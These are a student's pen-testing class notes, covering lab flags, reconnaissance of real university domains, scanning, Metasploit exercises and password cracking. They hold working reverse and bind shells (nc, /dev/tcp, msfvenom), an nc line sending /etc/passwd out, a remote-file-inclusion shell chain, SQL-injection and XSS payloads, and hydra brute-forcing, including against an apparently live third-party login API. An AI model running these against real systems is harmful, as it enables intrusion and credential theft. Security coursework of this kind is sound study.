# PEN TESTING STUFF

Some notes to a pen-testing class related my master exam

### Checklist

- https://github.com/purabparihar/Infrastructure-Pentesting-Checklist/blob/main/Infrastructure_Penetration_Testing_Checklist.pdf

## block1

### cat /etc/flag-extramile1

-> c√§sar chiffre üòÅ

how to get the flag: (decrypt caesar)

cat /etc/flag-extramile1 | tr [a-zA-Z] [n-za-mN-ZA-M]

##### encrypt:

echo "The flag is as follows: f990f5d366206bdaa08746ac0d2ded3880958c3d3744a7e0843033010b8c6bdc" | tr [n-za-mN-ZA-M] [a-zA-Z] " | tr [n-za-mN-ZA-M] [a-zA-Z]

OUTPUT: Gur synt vf nf sbyybjf: s990s5q366206oqnn08746np0q2qrq3880958p3q3744n7r0843033010o8p6oqp

### /etc/flag-extramile2

einfach base64 encoded weil ein "=" am schluss

how to get the flag:

```
base64 -d /etc/flag-extramile2
```

### /usr/local/bin/flag-extramile3

-> einfach cat und den plain key rauskopiert!
besser:
$ strings /usr/local/bin/flag-extramile3

### /usr/local/bin/flag-extramile4

-> anderer user needed zum ausf√ºhren
erster fix:

1. mit scp die binary auf kali host downloadn
2. gdb ./flag-extramile4
3. > start
4. disas

```
Dump of assembler code for function main:
0x00005555555551e6 <+0>: push rbp
0x00005555555551e7 <+1>: mov rbp,rsp
=> 0x00005555555551ea <+4>: sub rsp,0xe0
0x00005555555551f1 <+11>: mov DWORD PTR [rbp-0xd4],edi
0x00005555555551f7 <+17>: mov QWORD PTR [rbp-0xe0],rsi
0x00005555555551fe <+24>: lea rdi,[rip+0xe08] # 0x55555555600d
0x0000555555555205 <+31>: call 0x555555555050 <system@plt>
0x000055555555520a <+36>: test eax,eax
0x000055555555520c <+38>: jne 0x555555555238 <main+82>
0x000055555555520e <+40>: mov rax,QWORD PTR [rip+0x2e4b]
```

5. break \*0x000055555555520a
6. run
   -> breakt dann direkt bei \*0x000055555555520a

7. info reg eax

output 0

8. set $eax=1

WICHTIG: jne sprint wenn eax NICHT 0 is.
deshalb setzen wir eax einfach hart auf 1 HAHAHAHHAHAH

9. nun steppen bis wir den flag haben. NICE!!!

#### Frage nun: WER is jedoch der user den wir BR√ÑUCHTEN?

es wird "id" an die console (system call) geschickt

zweiter fix:
$ PATH="" /usr/local/bin/flag-extramile4

### remote password bruteforce:

siehe unten password attacks

## block2

- PASSIVE SERVICE ENUMERATION: GOOGLE, SHODAN, NETCRAFT, https://censys.io/ipv4?q=+hs-augsburg.de+gitlab

info gathering:

https://censys.io/ipv4?q=141.82.0.0%2F16+and+metadata.os%3Awindows+and+tags%3Amysql

141.82.0.0/16 and metadata.os:windows and tags:mysql

### find certs:

https://crt.sh/?q=architektur-bau.hs-augsburg.de&dir=^&sort=1&group=none

### find hostnames:

https://searchdns.netcraft.com/?restriction=site+contains&host=hs-augsburg.de&position=limited

### find wordpress files:

site:iu-fernstudium.de inurl:wp-admin

## block3

emails einer domain rausfinden:

$ theHarvester -d mwager.de -b google

-> found mail@mwager.de --> KRASS!

Domain enumeration

$ sublist3r -d hs-augsburg.de

### DNS stuff

```
$ nslookup -type=ns hs-augsburg.de
Server: 10.0.2.3
Address: 10.0.2.3#53

Non-authoritative answer:
hs-augsburg.de nameserver = deneb.dfn.de.
hs-augsburg.de nameserver = av2.RZ.FH-Augsburg.de.
hs-augsburg.de nameserver = primestation.RZ.FH-Augsburg.de.
```

### obtain mailservers:

dig MX hs-augsburg.de

### weitere tools f√ºr DNS lookups:

```
dig AXFR domain nameserver
host -l hs-augsburg.de nameserver

host  hs-augsburg.de av2.RZ.FH-Augsburg.de
```

```
nslookup -type=mx lecture2.local 10.5.13.21
```

get SOA record (incl emails)

```
nslookup -type=soa internal-lecture.local 10.5.13.21

# lookup dns stuff und check gleich bruteforce um subdomains zu finden
dnsenum hm-sec.de

DNSrr - A Tool Written In Bash, Used To Enumerate All The Juicy Stuff From DNS
https://www.kitploit.com/2021/07/dnsrr-tool-written-in-bash-used-to.html
```

### zone transfer (GET ALL SUBDOMAINS!!! KRASS.)

```
$ dig AXFR zonetransfer.me @nsztm1.digi.ninja

=> wenn der nameserver einen ZT erlaubt bekomm ich ALLE HOSTNAMES.
==> wichtig!
```

dr.zonetransfer.me. 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m

## block4 - active info gathering -> network scanning (script 06)

Subnetzmasken, network basics etc...

### Scanning technics

```
- arping -n -i HOST # sudo
- tcpdump # wireshark light -> sudo tcpdump -n -i eth0
- ICMP -> ping
- namp
```

### nmap knowledge

```
# -A Enable OS detection, version detection, script scanning, and traceroute
$ nmap -v -A scanme.nmap.org

# scan network ports: -sn: Ping Scan - disable port scan
$ nmap -v -sn scanme.nmap.org/16

# -sV -> check services running!
$ nmap -v -A -sV scanme.nmap.org

nmap scannt per default 1000 well known ports!
Scann ALL PORTS:
$ sudo nmap -A -sV -T5 10.5.123.0/24 -p- # also "-p-"

# get ip and mac of neighbour
ip neigh

nc - TCP/IP swiss army knife

$ nc 10.5.123.202 41414
ac9e06fafa7d76bade9106541dc4165dfb18155b580e2ab11924926f9583164a

```

### SUID bit find binaries with the SUID bit set

```
find / -perm -4000 -type f 2>/dev/null
```

## block5 - active info gathering #2 -> service discovery (script 07)

Thema: Enumeration: Angriffsvektoren finden

### Wordlists in kali

/usr/share/wordlists/

### Find URLs/directories on hosts

- DirBuster (UI. check with /usr/share/wordlists/dirb/small.txt)
- CLI:

```
dirb https://mwager.de/ /usr/share/wordlists/dirb/small.txt -v

oder

gobuster dir --url https://mwager.de/ -w /usr/share/wordlists/dirb/small.txt
```

### Burb Suite -> perform attacks on web applications

- TODO

mysql --host=10.5.134.178 --user=important_user --password=52991835a76dc17085dcfdf27159bc4a228d53fe91e695031704ff1a5e2a786b

### Nikto Web Scanner

Scan web servers in search of vulnerabilities and common dangerous configurations

```
nikto -h https://mwager.de
```

### Wordpress has its own scanner üòÅ

```
wpscan --url http://wordpress-installation.com

Search for vulnerabilities in kali:

$ searchsploit wordpress
$ searchsploit Theme Live Wire
dann:
$ locate php/webapps/37406.php
```

### SMB STUFF - find samba shared network devices

```
nmap -p 139,445 192.168.2.120
sudo nbtscan -r 192.168.2.120
enum4linux -a 192.168.2.120
```

### SNMP - simple network management protocol

```
nmap -sU -p 161 <network>

snmpwalk -v1 IP -c public iso.3.6.1.2.1.1.1.0
```

$ gobuster dir --url 10.5.22.8 -w /usr/share/wordlists/dirb/small.txt

### Find SMPT users:

```
nc -c IP 25
VRFY root
-> gibts root oder nicht?
```

### oder besser via list

```
$ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/namelist.txt  -t 10.5.72.178

mit -D f√ºr die domain!
$ smtp-user-enum -M VRFY -U /usr/share/wordlists/npt_list.txt -t 10.5.72.178 -D mailserv

```

### get running processes of a machine

```
snmpwalk -v1 10.5.81.65 -c public 1.3.6.1.2.1.25.4.2.1.2
```

## Tools for lab setup

- docker
- openvswitch
- imunes -> http://imunes.net/
- https://www.nrl.navy.mil/Our-Work/Areas-of-Research/Information-Technology/NCS/CORE/

Config tools:

kate /etc/experiment_control/conf

## block6 - Intro to exploits (script 08) mit alex

### start netcat server

```
# listen on port 4444 (e.g. on my host)
$ nc -lnvp 4444

# if I can upload a php file and get it to execute: shell access via bindshell
php bindshell:
system("nc -lnvp 4444 -e /bin/bash");


# check open ports on a host
$ ss -tln
$ ss -lun

# SEND file content (eg executables) to a server
# server:
$ nc -lnvp 4444 > foobar.txt
# client:
$ nc IP PORT < /etc/passwd

# GET file content (eg password files) from a server
# server:
$ nc -lnvp 4444 < /etc/passwd
# client:
$ nc IP PORT > some_file

# SHELL via nc ‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è
$ nc -l -p 4444 -e /usr/bin/bash
# other terminal:
$ ss -tln
$ nc 127.0.0.1 4444
ls
bin
brew.sh
Desktop
Documents
... HAHAHAHAH

# /dev/tcp
echo "HALLO" >&/dev/tcp/127.0.0.1/4444
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1


# python shells
python -c 'import pty; pty.spawn("/bin/sh")'

kali: /usr/share/webshells üòÅ
-> locate webshell

Other tool: man socat ;)

Other tool: Creating a Custom Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp - f elf LHOST=10.5.155.80 LPORT=4444 > shell

```

- bind shell: server waits for me to connect
- reverse shell: I am waiting for e command on the server to connect to my listener

## block7 - Vulnerability Identification (script 09)

Howto: Databses, automated scanners, manual inspection

- https://www.exploit-db.com/exploits/49880
- https://www.cvedetails.com/product/4096/Wordpress-Wordpress.html?vendor_id=2337
- https://nvd.nist.gov/vuln/search

* https://vulners.com/search
* $ searchsploit wordpress

Tools automated: manskipfish, wapiti, nikto?, Nessus, OpenVAS

## block8 - TODO (gran canaria)

- TODO nachholen!!!!!! wireshark & metasploit
  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

## block9 - TODO (script 12 start "common vulnerabilities")

### metasploit - Block 9 - Aufgabe 1

```
$ sudo nmap -sS 10.5.123.80
PORT   STATE SERVICE
21/tcp open  ftp    <---

msfconsole
> search pureftp
> use 0
> show options
> set payload linux/x86/shell/bind_tcp
> set rhost 10.5.123.80
> exploit
>> whoami
>> cat /root/flag
```

### Block 9 Aufgabe 2

```
set payload linux/x86/shell_reverse_tcp
set lhost 10.5.155.80
set rhost 10.5.123.82
```

### Block 9 Aufgabe 3

```
search shellshock
use 5
show options
set rhost 10.5.123.10
set targeturi cgi-bin/africa
set targeturi /cgi-bin/africa
set lport 8888
set lhost 10.5.155.80
set payload linux/x86/shell_reverse_tcp
exploit

find / -name flag
cat /run/flag
```

## block10 - (script 12 ab seite 20 "remote file inclusions")

### Password attacks

##### Generate wordlist from website (Custom Word List generator)

cewl -w generated_wordlist.txt -d 1 -m 5 https://mwager.de

## XSS attacks

Ppmap:
https://www.kitploit.com/2021/07/ppmap-scannerexploitation-tool-written.html

### Password crask hacks

```
locate wordlist

BEST for passwords:
$ less  /usr/share/wordlists/rockyou.txt

# THIS WORKS:
echo "sdasdsa' or '1' = '1" > mylist.txt
hydra -l test -P ./mylist.txt testphp.vulnweb.com http-post-form "/userinfo.php:uname=^USER^&pass=^PASS^:If you are already registered " -V

# This also:
hydra -l test -P /usr/share/dirb/wordlists/big.txt 10.5.134.55 -s 90 http-post-form "/pass/index.html:password=^PASS^:405" -V

touch wl.txt
echo "foo" > wl.txt
hydra -l mail@mwager.de -P ./wl.txt https://api.macx-transaction.com http-post-form "/login:emailOrPhone=^USER^&password=^PASS^" -V


# Block 10 Aufgabe 1:
$ hydra -l jacobs -P /usr/share/wordlists/npt_list.txt 10.5.201.23  ssh -V -I
[22][ssh] host: 10.5.201.23   login: jacobs   password: daniela

# hydra wordpress:
# 1. check for usernames:
hydra -vV -L fsocity.dic -p wedontcare 10.10.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

few minutes later....
>> [80][http-post-form] host: 192.168.2.4 login: elliot password: mypassword

# 2. check for password:
hydra -vV -l elliot -P fsocity.dic 10.10.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'

# Wordpress msfconsole (if you have admin access)
https://blog.christophetd.fr/write-up-mr-robot/

also:
crunch, john the ripper etc...

john --wordlist=/usr/share/wordlists/npt_list.txt shadow-file # eg /etc/shadow
```

### Hachcat (md5 unsalted - cracking)

```
password.md5 contains robot:c3fcd3d76192e4007dfb496cca67e13b

./hashcat64.bin -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt -o cracked.txt
```

### Aufgabe: (TODO nachholen) |

1. nc -lnvp 8888
2. msfvenom -p php/reverse_php LHOST=10.5.155.80 LPORT=8888 > remote_shell.php
3. sudo python -m SimpleHTTPServer 80
4. Access http://10.5.134.10/remote_file_inclusion.php?page=http://10.5.155.80/remote_shell.php

## block11 - (last?)

- TODOOOOOOOOOOOOOOO

## More important tools

-> https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/
-> http://testphp.vulnweb.com/listproducts.php?cat=".$.htaccess.aspx-->">'>'"<script>alert('OK')</script>

### skipfish

Find vulnerabilities in web apps.

```
rm -rf /tmp/skip
touch new_dict.wl
skipfish -t 90 -i 90 -w 90 -f1000 -b f -o /tmp/skip -W ./new_dict.wl http://testphp.vulnweb.com
```

### whatweb

Get information from hosts: e.g. apache vX.X, jQuery vx.X, modernizr, IP adress etc...

```
whatweb -v mwager.de
whatweb -v 192.168.0.1/24

# OWTF "Web application fingerprint" plugin --> "What is that site running?"
cd owtf_review/targets/http__testphp.vulnweb.com_/partial/Web\ Application\ Fingerprint/semi_passive;
whatweb --proxy 127.0.0.1:8008 --user-agent 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/15.0' --aggression 1 http://testphp.vulnweb.com/
whatweb --proxy 127.0.0.1:8008 --user-agent 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/15.0' --aggression 1 http://zero.webappsecurity.com/

```

### burpsuite

if I want to analyse a webpage from my computer, set proxy to butp in FF and burp than scans everything

https://www.youtube.com/watch?v=4CJMpZfK1rI

## Student tool presentations

### Autorecon and Sparta

beides tools die erstmal services checken und basierend darauf weitere tools launchen
zb HTTP found in scann -> launch nikto

beide tools √§hnlich, sparta halt via UI
eig √§hnlich wie OWTF..

### recon-ng

- reconnaissance framework auf python basis
- native oder docker based installation
- report generate support (html, csv etc)

### bettercap (alex :-)

- tool f√ºr WIFI Networks und Bluetooth, 2.4Ghz device attacks, IP4/6 attacks, MITM etc
- zb bluetooth tatstaturen recon und dann "√ºbernehmen" :)
- MITM via ARP.
- krasses tool!
- siehe ausarbeitung/pr√§si von alex :)

#### Install docker

```
$ docker pull bettercap/bettercap
$ docker run -it --privileged --net=host bettercap/bettercap
```

#### ARP spoof mit bettercap:

https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/

```

```

### sqlmap

- tools sucht nach sql injection
  Bsp:

```
sqlmap -u example.com/login?user=a&pass=b
```

### OWASP ZAP

- web app scanner / spider...

### w3af

### Wapiti

Find vulnerabilities in web apps.

```
wapiti  -v 1  -u http://testphp.vulnweb.com/ -f txt -o /tmp/wapiti --flush-session
```

Found stuff like this:
https://testphp.vulnweb.com/listproducts.php?artist=%3CScRiPt%3Ealert%28%27wgk3vo30ve%27%29%3C%2FsCrIpT%3E

LOGIN!
username: foo
password: foo' or '1' = '1

### wpscan

... :-)

### ffuf

A fast web fuzzer written in Go.
zb f√ºr password brute force auf web apps

- https://github.com/ffuf/ffuf#example-usage
- https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html

### Mimikatz

Mimikatz ist ein Tool, mit dem sich unter Ausnutzung von Schwachstellen zwischengespeicherte Anmeldedaten eines Rechners mit Microsoft Windows Betriebssystem anzeigen lassen

https://www.security-insider.de/was-ist-mimikatz-a-851187/

### Covenant

Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers.

https://github.com/cobbr/Covenant

### CrackMapExec

https://github.com/byt3bl33d3r/CrackMapExec/wiki

CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.

### BooFuzz

https://github.com/jtpereyda/boofuzz

Boofuzz is a fork of and the successor to the venerable Sulley fuzzing framework. Besides numerous bug fixes, boofuzz aims for extensibility. The goal: fuzz everything.
